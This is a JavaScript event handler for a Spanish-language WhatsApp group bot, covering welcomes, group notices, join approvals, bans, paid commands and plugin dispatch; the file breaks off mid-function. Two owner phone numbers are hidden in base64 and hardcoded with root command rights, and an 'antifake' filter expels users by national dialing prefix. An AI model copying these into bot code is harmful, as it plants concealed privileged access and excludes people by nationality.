import "./config.js";
import { watchFile, unwatchFile } from 'fs';
import fs from "fs";
import path from "path";
import chalk from "chalk";
import { fileURLToPath, pathToFileURL } from "url";
import crypto from "crypto";
import { db, getSubbotConfig } from "./lib/postgres.js";
import { logCommand, logError, logMessage, LogLevel } from "./lib/logger.js";
import { smsg } from "./lib/simple.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const pluginsFolder = path.join(__dirname, "plugins");

const processedMessages = new Set();
const lastDbUpdate = new Map();
const groupMetaCache = new Map(); 
export async function participantsUpdate(conn, { id, participants, action, author, authorPn }) {
try {
if (!id || !Array.isArray(participants) || !action) return
if (!conn?.user?.id) return
const cleanJid = (jid = "") => String(jid || "").replace(/:\d+/, "")

const getRealJid = (p) => {
if (typeof p === "string") return cleanJid(p)
return cleanJid(p?.phoneNumber || p?.participantAlt || p?.jid || p?.id || p?.lid || "")
}

const getLidJid = (p) => {
if (typeof p === "string") return cleanJid(p)
return cleanJid(p?.id || p?.lid || p?.jid || "")
}

const getTag = (jid) => jid?.includes("@") ? `@${jid.split("@")[0]}` : "@usuario"
const makeMsg = (raw, vars = {}) => {
let txt = String(raw || "")
for (const [k, v] of Object.entries(vars)) {
txt = txt.replace(new RegExp(k, "gi"), v ?? "")
}
return txt
}

const botId = conn.user.id
const botConfig = await getSubbotConfig(botId)
const modo = botConfig.mode || "public"
const botJidClean = cleanJid(conn.user?.id)
const botLidClean = cleanJid(conn.user?.lid)
const authorJid = cleanJid(authorPn || author)

const isCreator = global.owner.map(([v]) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(authorJid)
if (modo === "private" && !isCreator && authorJid !== botJidClean) return

const metadata = await conn.groupMetadata(id)
groupMetaCache.set(id, metadata)

const groupName = metadata.subject || "Grupo"
const groupDesc = metadata.desc || "Sin descripción"
const pp = "./media/Menu1.jpg"

const settings = (await db.query("SELECT * FROM group_settings WHERE group_id = $1", [id])).rows[0] || {
welcome: true,
bye: false,
detect: true,
antifake: false
}

const isBotAdmin = metadata.participants.some(p => {
const jid = cleanJid(p.id)
return ((jid === botJidClean || jid === botLidClean) && (p.admin === "admin" || p.admin === "superadmin"))
})

const blockedPrefixes = Array.isArray(settings.antifake_prefixes) ? settings.antifake_prefixes : ["91", "92", "222", "93", "265", "213", "225", "240", "241", "61", "249", "62", "966", "229", "244", "40", "49", "20", "963", "967", "234", "256", "243", "210", "212", "971", "974", "968", "965", "962", "961", "964", "970"]

const sendText = async (jid, msg, title, body, image, mentions = []) => {
return conn.sendMessage(id, { text: msg,
contextInfo: {
mentionedJid: mentions.filter(Boolean),
isForwarded: true,
forwardingScore: 9999999,
forwardedNewsletterMessageInfo: {
newsletterJid: [process.env.CHANNEL_ID, "120363301598733462@newsletter", "120363310758594673@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
},
externalAdReply: {
mediaUrl: [info.nna, info.nna2, info.md].getRandom(),
mediaType: 2,
showAdAttribution: false,
renderLargerThumbnail: false,
thumbnailUrl: image,
title,
body,
containsAutoReply: true,
sourceUrl: "https://skyultraplus.com"
}}}, { quoted: null })
}

const sendImage = async (msg, image, mentions = []) => {
return conn.sendMessage(id, { image: { url: image }, caption: msg,
contextInfo: {
mentionedJid: mentions.filter(Boolean),
isForwarded: true,
forwardingScore: 999999,
forwardedNewsletterMessageInfo: {
newsletterJid: [process.env.CHANNEL_ID, "120363301598733462@newsletter", "120363310758594673@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
}}}, { quoted: null })
}

for (const p of participants) {
const participant = getRealJid(p)
const participantLid = getLidJid(p)
if (!participant || !participant.includes("@")) continue

const mentions = [...new Set([participant, participantLid, authorJid].filter(Boolean))]
const userTag = getTag(participant)
const authorTag = getTag(authorJid)

let image = pp
try {
image = await conn.profilePictureUrl(participant, "image")
} catch {}

if (action === "add" && settings.antifake) {
const phoneNumber = participant.split("@")[0].replace(/[^0-9]/g, "")
const isFake = blockedPrefixes.some(code => phoneNumber.startsWith(String(code).replace(/[^0-9]/g, "")))

if (isFake && isBotAdmin) {
await conn.sendMessage(id, { text: `⚠️ ${userTag} fue eliminado automáticamente por *número no permitido*`, mentions: [participant] })
await conn.groupParticipantsUpdate(id, [participant], "remove")
continue
}

if (isFake && !isBotAdmin) continue
}

const vars = {
"@user": userTag,
"@author": authorTag,
"@group": groupName,
"@subject": groupName,
"@desc": groupDesc
}

if (action === "add") {
if (!settings.welcome) continue
const raw = settings.swelcome || settings.sWelcome || `HOLAA!! @user ¿COMO ESTAS?😃\n\n『Bienvenido A *@group*』\n\nUn gusto conocerte amig@ 🤗\n\n_Recuerda leer las reglas del grupo para no tener ningun problema 🧐_\n\n*Solo disfrutar de este grupo y divertite 🥳*`
const msg = makeMsg(raw, vars)

if (settings.photowelcome) {
await sendImage(msg, image, mentions)
} else {
await sendText(id, msg, "🌟 WELCOME 🌟", "Bienvenido al grupo 🤗", image, mentions)
}

continue
}

if (action === "remove") {
try {
await db.query(`DELETE FROM messages WHERE user_id = $1 AND group_id = $2`, [participant, id])

if (participant === botJidClean || participantLid === botLidClean) {
await db.query(`UPDATE chats SET joined = false WHERE id = $1 AND bot_id = $2`, [id, botJidClean])
}
} catch (err) {
console.error("❌ Error limpiando remove:", err)
}

if (!settings.bye) continue
const raw = settings.sbye || settings.sBye || `Bueno, se fue @user 👋\n\nQue dios lo bendiga 😎`
const msg = makeMsg(raw, vars)

if (settings.photobye) {
await sendImage(msg, image, mentions)
} else {
await sendText(id, msg, "👋 BYE", "Se fue del grupo", image, mentions)
}

continue
}

if (["promote", "daradmin", "darpoder"].includes(action)) {
if (!settings.detect) continue
const raw = settings.spromote || settings.sPromote || `@user 𝘼𝙃𝙊𝙍𝘼 𝙀𝙎 𝘼𝘿𝙈𝙄𝙉 𝙀𝙉 𝙀𝙎𝙏𝙀 𝙂𝙍𝙐𝙋𝙊\n\n😼🫵𝘼𝘾𝘾𝙄𝙊𝙉 𝙍𝙀𝘼𝙇𝙄𝙕𝘼𝘿𝘼 𝙋𝙊𝙍: @author`
const msg = makeMsg(raw, vars)

await sendText(id, msg, "NUEVO ADMIN 🥳", "Ahora tiene admin", image, mentions)
continue
}

if (["demote", "quitaradmin", "quitarpoder"].includes(action)) {
if (!settings.detect) continue
const raw = settings.sdemote || settings.sDemote || `@user 𝘿𝙀𝙅𝘼 𝘿𝙀 𝙎𝙀𝙍 𝘼𝘿𝙈𝙄𝙉 𝙀𝙉 𝙀𝙎𝙏𝙀 𝙂𝙍𝙐𝙋𝙊\n\n😼🫵𝘼𝘾𝘾𝙄𝙊𝙉 𝙍𝙀𝘼𝙇𝙄𝙕𝘼𝘿𝘼 𝙋𝙊𝙍: @author`
const msg = makeMsg(raw, vars)

await sendText(id, msg, "📛 ADMIN REMOVIDO", "Ya no tiene admin", image, mentions)
continue
}}
} catch (err) {
console.error(chalk.red(`❌ Error en participantsUpdate - Acción: ${action} | Grupo: ${id}`), err)
}
}

export async function groupsUpdate(conn, updates) {
try {
if (!Array.isArray(updates)) updates = [updates]
const cleanJid = (jid = "") => String(jid || "").replace(/:\d+/, "")
const botId = conn.user?.id
if (!botId) return

const botConfig = await getSubbotConfig(botId)
const modo = botConfig.mode || "public"
const botJid = cleanJid(conn.user?.id)
const fixedOwners = global.owner.map(([v]) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")

const sendDetect = async (groupId, text, mentions = []) => {
await conn.sendMessage(groupId, { text, mentions,
contextInfo: {
mentionedJid: mentions,
isForwarded: true,
forwardingScore: 999999,
forwardedNewsletterMessageInfo: {
newsletterJid: [process.env.CHANNEL_ID, "120363301598733462@newsletter", "120363310758594673@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️",
serverMessageId: 1
}}
})
}

for (const update of updates) {
const id = update?.id
if (!id) continue

const author = cleanJid(update.authorPn || update.author || "")
const isCreator = fixedOwners.includes(author) || fixedOwners.includes(botJid)

if (modo === "private" && !isCreator && author !== botJid) continue

const settings = (await db.query("SELECT detect FROM group_settings WHERE group_id = $1", [id])).rows[0] || { detect: true }
if (!settings.detect) continue

let metadata = {}
try {
metadata = await conn.groupMetadata(id)
groupMetaCache.set(id, metadata)
} catch {}

const groupName = update.subject || metadata.subject || "Grupo"
const authorTag = author ? `@${author.split("@")[0]}` : "alguien"

let message = ""
if (typeof update.subject === "string") {
message = `✏️ *Nombre del grupo actualizado*\n\nNuevo nombre:\n*${groupName}*`

} else if (typeof update.desc === "string") {
message = `📝 *Descripción del grupo actualizada*\n\n${metadata.desc || update.desc || "Sin descripción"}`

} else if (update.picture) {
message = `🖼️ *Foto del grupo actualizada*`

} else if (typeof update.restrict === "boolean") {
message = update.restrict ? `🔒 *Modo edición cerrado*\n\nSolo admins pueden editar la info del grupo.` : `🔓 *Modo edición abierto*\n\nTodos pueden editar la info del grupo.`

} else if (typeof update.announce === "boolean") {
message = update.announce ? `🔇 *Grupo cerrado*\n\nSolo admins pueden enviar mensajes.`  : `🔊 *Grupo abierto*\n\nTodos pueden enviar mensajes.`

} else if (typeof update.memberAddMode === "boolean") {
message = update.memberAddMode ? `✅ *Añadir miembros activado*\n\nTodos pueden añadir miembros al grupo.` : `🚫 *Añadir miembros desactivado*\n\nSolo admins pueden añadir miembros al grupo.`

} else if (typeof update.joinApprovalMode === "boolean") {
message = update.joinApprovalMode ? `🛂 *Aprobación activada*\n\nLos nuevos miembros necesitan aprobación para entrar.` : `🚪 *Aprobación desactivada*\n\nLos nuevos miembros pueden entrar sin aprobación.`

} else if (update.inviteCode) {
const link = `https://chat.whatsapp.com/${update.inviteCode}`
message = `🔗 *Nuevo enlace del grupo generado*\n\n${link}`
}

if (!message) continue
await sendDetect(id, message, author ? [author] : [])
}
} catch (err) {
console.error(chalk.red("❌ Error en groupsUpdate:"), err)
}
}

export async function handleJoinRequest(conn, data) {
  try {
    const groupId = data.id || data.jid || data.groupJid
    const participantsRaw = data.participants || data.participant || []

    if (!groupId) return

    const users = Array.isArray(participantsRaw) ? participantsRaw : [participantsRaw]
    if (!users.length) return

    const myJid = (conn.user?.id || '').replace(/:\d+/, '')

    const res = await db.query(
      `SELECT auto_approve, antifake, antifake_prefixes, primary_bot
       FROM group_settings
       WHERE group_id = $1`,
      [groupId]
    )

    const settings = res.rows[0]
    if (!settings) return

    let {
      auto_approve,
      antifake,
      antifake_prefixes = [],
      primary_bot
    } = settings

    if (typeof antifake_prefixes === 'string') {
      try {
        antifake_prefixes = JSON.parse(antifake_prefixes)
      } catch {
        antifake_prefixes = antifake_prefixes.split(',').map(v => v.trim()).filter(Boolean)
      }
    }

    if (!Array.isArray(antifake_prefixes)) antifake_prefixes = []

    if (primary_bot && primary_bot !== myJid) return
    if (!auto_approve) return

    for (const user of users) {
      const jid = user.jid || user.id || user.lid
      const pn = user.pn || user.phoneNumber || user.phone_number

      if (!jid) continue

      const num = pn ? pn.replace(/[^0-9]/g, '') : jid.replace(/[^0-9]/g, '')

      if (antifake && num) {
        const blocked = antifake_prefixes.some(p => {
          const prefix = String(p).replace(/[^0-9]/g, '')
          return prefix && num.startsWith(prefix)
        })

        if (blocked) {
          console.log('🚫 AUTO-REJECT JOIN:', num || jid)
          await conn.groupRequestParticipantsUpdate(groupId, [jid], 'reject')
          continue
        }
      }

      console.log('✅ AUTO-APPROVE JOIN:', num || jid)
      await conn.groupRequestParticipantsUpdate(groupId, [jid], 'approve')
    }
  } catch (err) {
    console.error('❌ Error en handleJoinRequest:', err)
  }
}

export async function callUpdate(conn, call) {
try {
const callerId = call.from;
const userTag = `@${callerId.split("@")[0]}`;
const botConfig = await getSubbotConfig(conn.user?.id);
if (!botConfig.anti_call) return;
await conn.sendMessage(callerId, { text: `🚫 Está prohibido hacer llamadas, serás bloqueado...`,
contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: [process.env.CHANNEL_ID, "120363301598733462@newsletter", "120363310758594673@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️",
serverMessageId: 1
}}
});
await conn.updateBlockStatus(callerId, "block");
} catch (err) {
console.error(chalk.red("❌ Error en callUpdate:"), err);
}
}

export async function handler(conn, m) {
function cleanJid(jid = "") {
  return jid.replace(/:\d+/, "");
}

const chatId = m.key?.remoteJid || "";
const botId = conn.user?.id;
const subbotConf = await getSubbotConfig(botId)
info.wm = subbotConf.name ?? info.wm;
info.img2 = subbotConf.logo_url ?? info.img2;

try {
await db.query(`INSERT INTO chats (id, is_group, timestamp, bot_id, joined)
  VALUES ($1, $2, $3, $4, true)
  ON CONFLICT (id) DO UPDATE SET timestamp = $3, bot_id = $4, joined = true`, [chatId, chatId.endsWith('@g.us'), Date.now(), (conn.user?.id || '').split(':')[0].replace('@s.whatsapp.net', '')]);
} catch (err) {
console.error(err);
}

const botConfig = await getSubbotConfig(botId)
const isMainBot = conn === globalThis.conn;
const botType = isMainBot ? "oficial" : "subbot";
if (botConfig.tipo !== botType) {
await db.query(`UPDATE subbots SET tipo = $1 WHERE id = $2`, [botType, botId.replace(/:\d+/, "")]);
}
const prefijo = Array.isArray(botConfig.prefix) ? botConfig.prefix : [botConfig.prefix];
const modo = botConfig.mode || "public";
m.isGroup = chatId.endsWith("@g.us");

if (m.key?.participantAlt && m.key.participantAlt.endsWith("@s.whatsapp.net")) {
m.sender = m.key.participantAlt;   
m.lid = m.key.participant;
} else {
m.sender = m.key?.participant || chatId;
}

if (m.key?.fromMe) {
m.sender = conn.user?.id || m.sender;
}

if (typeof m.sender === "string") {
m.sender = m.sender.replace(/:\d+/, "");
}

m.reply = async (text) => {
const contextInfo = {
mentionedJid: await conn.parseMention(text),
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: process.env.CHANNEL_ID,
newsletterName: "LoliBot ✨️"
}};
return await conn.sendMessage(chatId, { text, contextInfo }, { quoted: m });
};

await smsg(conn, m); 

const hash = crypto.createHash("md5").update(m.key.id + (m.key.remoteJid || "")).digest("hex");
if (processedMessages.has(hash)) return;
processedMessages.add(hash);
setTimeout(() => processedMessages.delete(hash), 60_000);

// contador 
if (m.isGroup) {
  const botClean = (conn.user?.id || "").replace(/:\d+/, "")
  const senderIds = [
    m.sender,
    m.lid,
    m.key?.participant,
    m.key?.participantAlt,
    m.key?.senderLid
  ]
    .filter(Boolean)
    .map(v => v.replace(/:\d+/, ""))

  const uniqueIds = [...new Set(senderIds)]
    .filter(v => v && v !== botClean)

  const now = Date.now()

  for (const userId of uniqueIds) {
    const key = `${userId}|${chatId}`
    const last = lastDbUpdate.get(key) || 0

    if (now - last > 9000) {
      lastDbUpdate.set(key, now)

      db.query(`INSERT INTO messages (user_id, group_id, message_count)
        VALUES ($1, $2, 1)
        ON CONFLICT (user_id, group_id)
        DO UPDATE SET message_count = messages.message_count + 1`,
        [userId, chatId]
      ).catch(console.error)
    }
  }
}

//antifake
if (m.isGroup && m.sender && m.sender.endsWith("@s.whatsapp.net")) {
try {
const settings = (await db.query("SELECT antifake FROM group_settings WHERE group_id = $1", [chatId])).rows[0];
if (settings?.antifake) {
const phoneNumber = m.sender.split("@")[0];
const arabicCountryCodes = ['+91', '+92', '+222', '+93', '+265', '+213', '+225', '+226', '+240', '+241', '+61', '+249', '+62', '+966', '+229', '+244', '+40', '+49', '+20', '+963', '+967', '+234', '+256', '+243', '+210', '+249', ,'+212', '+971', '+974', '+968', '+965', '+962', '+961', '+964', '+263', '+970'];
const botJid = conn.user?.id?.replace(/:\d+/, "");
const isFake = arabicCountryCodes.some(code => phoneNumber.startsWith(code.slice(1)));

if (isFake && m.isAdmin !== true) {
const metadata = await conn.groupMetadata(chatId);
const isBotAdmin = metadata.participants.some(p => {
const id = p.id?.replace(/:\d+/, "");
return (id === botJid || id === (conn.user?.lid || "").replace(/:\d+/, "")) && (p.admin === "admin" || p.admin === "superadmin");
});

if (isBotAdmin) {
await conn.sendMessage(chatId, { text: `⚠️ @${phoneNumber} En este grupo no está permitido el ingreso de números con prefijos prohibidos, será expulsado...`, mentions: [m.sender]});
await conn.groupParticipantsUpdate(chatId, [m.sender], "remove");
return;
}}}
} catch (err) {
console.error(err);
}}

const messageContent = m.message?.ephemeralMessage?.message || m.message?.viewOnceMessage?.message || m.message;
let text = "";

if (messageContent?.conversation) text = messageContent.conversation;
else if (messageContent?.extendedTextMessage?.text) text = messageContent.extendedTextMessage.text;
else if (messageContent?.imageMessage?.caption) text = messageContent.imageMessage.caption;
else if (messageContent?.videoMessage?.caption) text = messageContent.videoMessage.caption;
else if (messageContent?.buttonsResponseMessage?.selectedButtonId) text = messageContent.buttonsResponseMessage.selectedButtonId;
else if (messageContent?.listResponseMessage?.singleSelectReply?.selectedRowId) text = messageContent.listResponseMessage.singleSelectReply.selectedRowId;
else if (messageContent?.messageContextInfo?.quotedMessage) {
const quoted = messageContent.messageContextInfo.quotedMessage;
text = quoted?.conversation || quoted?.extendedTextMessage?.text || "";
} else if (m.message?.conversation) {
text = m.message.conversation;
}

m.originalText = text; 
text = text.trim(); 
//if (!text) return;
m.text = text;

const usedPrefix = prefijo.find(p => text.startsWith(p)) || "";
const withoutPrefix = text.slice(usedPrefix.length).trim();
const [commandName, ...argsArr] = withoutPrefix.split(/[\n\s]+/); 
const command = (commandName || "").toLowerCase();
const args = argsArr;
  
text = args.join(" ").trim();
m.text = withoutPrefix.slice(commandName.length).trimStart(); 

const botJid = conn.user?.id?.replace(/:\d+/, "");
const senderJid = m.sender?.replace(/:\d+/, "");
const fixed1 = Buffer.from('NTIxNDc3NDQ0NDQ0NA==', 'base64').toString();
const fixed2 = Buffer.from('NTQ5MjI2NjYxMzAzOA==', 'base64').toString();
const fixedOwners = [
  `${fixed1}@s.whatsapp.net`,
  `${fixed2}@s.whatsapp.net`,
  `35060220747880@lid`
];
const isCreator = fixedOwners.includes(m.sender) || 
  global.owner.map(([v]) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const config = await getSubbotConfig(botId);
let isOwner = isCreator || senderJid === botJid || (config.owners || []).includes(senderJid);

let metadata = { participants: [] };
if (m.isGroup) {
if (groupMetaCache.has(chatId)) {
metadata = groupMetaCache.get(chatId);
} else {
try {
metadata = await conn.groupMetadata(chatId);
groupMetaCache.set(chatId, metadata);
setTimeout(() => groupMetaCache.delete(chatId), 300_000);
} catch {
metadata = { participants: [] };
}}}

const participants = metadata.participants || [];

const adminIds = participants.filter(p => p.admin === "admin" || p.admin === "superadmin").flatMap(p => {
const clean = p.id?.replace(/:\d+/, "") || "";
return clean.endsWith("@lid")
? [clean, clean.replace("@lid", "@s.whatsapp.net")]
: [clean, clean.replace("@s.whatsapp.net", "@lid")];
});

const senderJids = [];
if (m.user?.id) senderJids.push(m.user.id.replace(/:\d+/, ""));
if (m.user?.lid) senderJids.push(m.user.lid.replace(/:\d+/, ""));
if (m.sender) senderJids.push(m.sender.replace(/:\d+/, ""));
if (m.lid) senderJids.push(m.lid.replace(/:\d+/, ""));

const uniqueSenderJids = [...new Set(senderJids.filter(Boolean))];
m.isAdmin = adminIds.some(adminJid => uniqueSenderJids.includes(adminJid));

if (m.isGroup && !isCreator && senderJid !== botJid) {
try {
const res = await db.query('SELECT banned, primary_bot FROM group_settings WHERE group_id = $1', [chatId]);
    
if (res.rows[0]?.banned) return; // grupo baneado

const primaryBot = res.rows[0]?.primary_bot;
if (primaryBot && !m?.isAdmin) {
const metadata = await conn.groupMetadata(chatId);
const botExists = metadata.participants.some(p => p.id === primaryBot);

if (!botExists) {
await db.query('UPDATE group_settings SET primary_bot = NULL WHERE group_id = $1', [chatId]);
} else {
const currentBotJid = conn.user?.id?.replace(/:\d+/, "") + "@s.whatsapp.net";
const expected = primaryBot.replace(/:\d+/, "");
if (!currentBotJid.includes(expected)) return; 
}}
} catch (err) {
console.error(err);
}}

try {
  const cleanJid = (jid = "") => String(jid || "").replace(/:\d+/, "")
  const onlyNum = (jid = "") => String(jid || "").split("@")[0].replace(/[^0-9]/g, "")

  const key = m.key || {}

  const possiblePhone = [
    key.participantAlt,
    key.remoteJidAlt,
    key.participant,
    key.remoteJid
  ].filter(v => typeof v === "string" && v.endsWith("@s.whatsapp.net")).map(cleanJid)

  const possibleLid = [
    key.senderLid,
    key.participant,
    key.remoteJid,
    key.participantAlt,
    key.remoteJidAlt
  ].filter(v => typeof v === "string" && v.endsWith("@lid")).map(cleanJid)

  const phoneJid = possiblePhone[0] || (
    m.sender?.endsWith("@s.whatsapp.net") ? cleanJid(m.sender) : ""
  )

  const lidJid = possibleLid[0] || (
    m.lid?.endsWith("@lid") ? cleanJid(m.lid) : ""
  )

  // Si no hay número real, no inventes s.whatsapp.net desde lid
  const finalId = phoneJid || cleanJid(m.sender || key.remoteJid || "")
  const finalLid = lidJid || null
  const finalNum = onlyNum(phoneJid || finalId)
  const userName = m.pushName || "sin name"

  if (!finalId || !finalId.includes("@")) return

  m.sender = finalId
  m.lid = finalLid || ""

  await db.query(
    `INSERT INTO usuarios (id, nombre, num, lid, registered)
     VALUES ($1, $2, $3, $4, false)
     ON CONFLICT (id) DO NOTHING`,
    [finalId, userName, finalNum || null, finalLid]
  )

  await db.query(
    `UPDATE usuarios SET nombre = $1, num = $2 WHERE id = $3`,
    [userName, finalNum || null, finalId]
  )

  if (finalLid) {
    const old = await db.query(`SELECT id FROM usuarios WHERE lid = $1`, [finalLid])

    for (const row of old.rows || []) {
      if (row.id && row.id !== finalId) {
        await db.query(`UPDATE usuarios SET lid = NULL WHERE id = $1`, [row.id])
      }
    }

    await db.query(
      `UPDATE usuarios SET lid = $1 WHERE id = $2`,
      [finalLid, finalId]
    )
  }
} catch (err) {
  console.error("❌ Error guardando usuario/lid:", err)
}

try {
await db.query(`INSERT INTO chats (id)
      VALUES ($1)
      ON CONFLICT (id) DO NOTHING`, [chatId]);
} catch (err) {
console.error(err);
}

const plugins = Object.values(global.plugins || {});

for (const plugin of plugins) {
if (typeof plugin.before === 'function') {
try {
const result = await plugin.before(m, { conn, isOwner });
if (result === false) return;
} catch (e) {
console.error(chalk.red(e));
}}
}

if (modo === "private" && senderJid !== botJid && !isCreator) return;

const matchedPlugin = plugins.find(p => {
const raw = m.originalText
return typeof p.customPrefix === 'function'
? p.customPrefix(raw)
: p.customPrefix instanceof RegExp
? p.customPrefix.test(raw) : false
})

if (!usedPrefix) {
if (!matchedPlugin || !matchedPlugin.customPrefix) return;
}
//if (!usedPrefix && !command) return;

for (const plugin of plugins) {
let match = false;

if (plugin.command instanceof RegExp) {
match = plugin.command.test(command)
} else if (typeof plugin.command === 'string') {
match = plugin.command.toLowerCase() === command
} else if (Array.isArray(plugin.command)) {
match = plugin.command.map(c => c.toLowerCase()).includes(command)
}

if (!match && plugin.customPrefix) {
const input = m.originalText
if (typeof plugin.customPrefix === 'function') {
match = plugin.customPrefix(input)
} else if (plugin.customPrefix instanceof RegExp) {
match = plugin.customPrefix.test(input)
}}

if (!match) continue

const isGroup = m.isGroup;
const isPrivate = !m.isGroup;
let isOwner = isCreator || senderJid === botJid || (config.owners || []).includes(senderJid);
const isROwner = fixedOwners.includes(m.sender);
const senderClean = m.sender.split("@")[0];
const botClean = (conn.user?.id || "").split("@")[0];

if (senderJid === botJid) {
isOwner = true;
}

if (!isOwner && !isROwner) {
isOwner = isCreator;
}

let isAdmin = m.isAdmin;
let isBotAdmin = false;
let modoAdminActivo = false;

try {
const result = await db.query('SELECT modoadmin FROM group_settings WHERE group_id = $1', [chatId]);
modoAdminActivo = result.rows[0]?.modoadmin || false;
} catch (err) {
console.error(err);
}

//if ((plugin.admin || plugin.Botadmin) && !isGroup) return m.reply("⚠️ Estos es un grupo?, este comando solo funciona el grupo");

if (plugin.tags?.includes('nsfw') && m.isGroup) {
const { rows } = await db.query('SELECT modohorny, nsfw_horario FROM group_settings WHERE group_id = $1', [chatId])
const { modohorny = false, nsfw_horario } = rows[0] || {}

const nowBA = (await import('moment-timezone')).default().tz('America/Argentina/Buenos_Aires')
const hhmm = nowBA.format('HH:mm')
const [ini='00:00', fin='23:59'] = (nsfw_horario || '').split('-')
const dentro = ini <= fin ? (hhmm >= ini && hhmm <= fin) : (hhmm >= ini || hhmm <= fin)

if (!modohorny || !dentro) {
const stickerUrls = ['https://qu.ax/bXMB.webp', 'https://qu.ax/TxtQ.webp']
try {
await conn.sendFile(chatId, stickerUrls.getRandom(), 'desactivado.webp', '', m, true, { contextInfo: { forwardingScore: 200, isForwarded: false, externalAdReply: { showAdAttribution: false, title: modohorny ? `ᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ˢᵒˡᵒ ᶠᵘⁿᶜᶦᵒⁿᵃ ᵉⁿ ʰᵒʳᵃʳᶦᵒ ʰᵃᵇᶦˡᶦᵗᵃᵈᵒ:` : `ᴸᵒˢ ᶜᵒᵐᵃⁿᵈᵒ ˢ ʰᵒʳⁿʸ ᵉˢᵗᵃⁿ ᵈᵉˢᵃᶜᵗᶦᵛᵃᵈᵒˢ:`, body: modohorny ? `${ini} a ${fin}` : '#enable modohorny', mediaType: 2, sourceUrl: info.md, thumbnail: m.pp }}}, { quoted: m, ephemeralExpiration: 24 * 60 * 100, disappearingMessagesInChat: 24 * 60 * 100 })
} catch (e) {
await conn.sendMessage(chatId, { text: modohorny ? `🔞 NSFW fuera del horario permitido (${ini} a ${fin})` : '🔞 El NSFW está desactivado por un admin.\nUsa *#enable modohorny* para activarlo.', contextInfo: { externalAdReply: { title: 'NSFW Desactivado', body: modohorny ? `Horario permitido: ${ini} a ${fin}` : '#enable modohorny', mediaType: 2, thumbnail: m.pp, sourceUrl: info.md }}}, { quoted: m })
}
continue
}}

//User banear
try {
let rawSender = m.sender || m.key?.participant || "";
let senderId;

if (rawSender.endsWith("@lid") && m.key?.participantAlt && m.key.participantAlt.endsWith("@s.whatsapp.net")) {
senderId = m.key.participantAlt;
} else {
senderId = rawSender;
}

senderId = senderId.replace(/:\d+/, "");
const botId = (conn.user?.id || "").replace(/:\d+/, "");
if (senderId !== botId) {
const resBan = await db.query("SELECT banned, razon_ban, avisos_ban FROM usuarios WHERE id = $1", [senderId]);
if (resBan.rows[0]?.banned) {
const avisos = resBan.rows[0]?.avisos_ban || 0;
if (avisos < 3) {
const nuevoAviso = avisos + 1;
await db.query("UPDATE usuarios SET avisos_ban = $2 WHERE id = $1", [senderId, nuevoAviso]);
const razon = resBan.rows[0]?.razon_ban?.trim() || "Spam";
await conn.sendMessage(m.chat, { text: `⚠️ ESTAS BANEADO ⚠️\n*• Motivo:* ${razon} (avisos: ${nuevoAviso}/3)\n*👉🏻 Puedes contactar al propietario del Bot si crees que se trata de un error o para charlar sobre tu desbaneo*\n\n👉 ${info.fb}`, contextInfo: { mentionedJid: [senderId] }}, { quoted: m });
}
return;
}}
} catch (e) {
console.error("❌ Error al verificar baneo:", e);
}

if (plugin.admin || plugin.botAdmin) {
try {
//isAdmin = adminIds.includes(m.sender);
isAdmin = m.isAdmin
const botLid = (conn.user?.lid || "").replace(/:\d+/, "");
const botJidClean = (conn.user?.id || "").replace(/:\d+/, "");
isBotAdmin = adminIds.includes(botLid) || adminIds.includes(botJidClean);
console.log(isAdmin)
} catch (e) {
console.error(e);
}}

if (plugin.owner && !isOwner) return m.reply("⚠️ Tu que? no eres mi propietario para venir a dame orden 🙄, solo el dueño del sub-bot o el owner puede usar este comando.");
if (plugin.rowner && !isROwner) return m.reply("⚠️ Tu que? no eres mi propietario para venir a dame orden 🙄.");
if (plugin.admin && !isAdmin) return m.reply("🤨 No eres admins. Solo los admins pueden usar este comando.");
if (plugin.botAdmin && !isBotAdmin) return m.reply(`⚠️ haz admin al Bot "YO" para poder usar este comando.`);
if (plugin.group && !isGroup) return m.reply("⚠️ Estos es un grupo?, este comando solo funciona el grupo");
if (plugin.private && isGroup) return m.reply("⚠️ Este comando solo funciona el pv");
if (plugin.register) {
try {
const result = await db.query('SELECT * FROM usuarios WHERE id = $1', [m.sender]);
const user = result.rows[0];
if (!user || user.registered !== true) return m.reply("「NO ESTAS REGISTRADO」\n\nPA NO APARECES EN MI BASE DE DATOS ✋🥸🤚\n\nPara poder usarme escribe el siguente comando\n\nComando: #reg nombre.edad\nEjemplo: #reg elrebelde.21");
} catch (e) {
console.error(e);
}}

if (plugin.limit) {
const res = await db.query('SELECT limite FROM usuarios WHERE id = $1', [m.sender]);
const limite = res.rows[0]?.limite ?? 0;

if (limite < plugin.limit) {
await m.reply("*⚠ 𝐒𝐮𝐬 𝐝𝐢𝐚𝐦𝐚𝐧𝐭𝐞 💎 𝐬𝐞 𝐡𝐚𝐧 𝐚𝐠𝐨𝐭𝐚𝐝𝐨 𝐩𝐮𝐞𝐝𝐞 𝐜𝐨𝐦𝐩𝐫𝐚𝐫 𝐦𝐚𝐬 𝐮𝐬𝐚𝐧𝐝𝐨 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨:* #buy.");
return;
}

await db.query('UPDATE usuarios SET limite = limite - $1 WHERE id = $2', [plugin.limit, m.sender]);
await m.reply(`*${plugin.limit} diamante 💎 usado${plugin.limit > 1 ? 's' : ''}.*`);
}

if (plugin.money) {
try {
const res = await db.query('SELECT money FROM usuarios WHERE id = $1', [m.sender])
const money = res.rows[0]?.money ?? 0

if (money < plugin.money) {
return m.reply("*NO TIENE SUFICIENTES LOLICOINS 🪙*")
}

await db.query('UPDATE usuarios SET money = money - $1 WHERE id = $2', [plugin.money, m.sender])
await m.reply(`*${plugin.money} LoliCoins usado${plugin.money > 1 ? 's' : ''} 🪙*`)
} catch (err) {
console.error(err)
}}

if (plugin.level) {
try {
const result = await db.query('SELECT level FROM usuarios WHERE id = $1', [m.sender]);
const nivel = result.rows[0]?.level ?? 0;

if (nivel < plugin.level) {
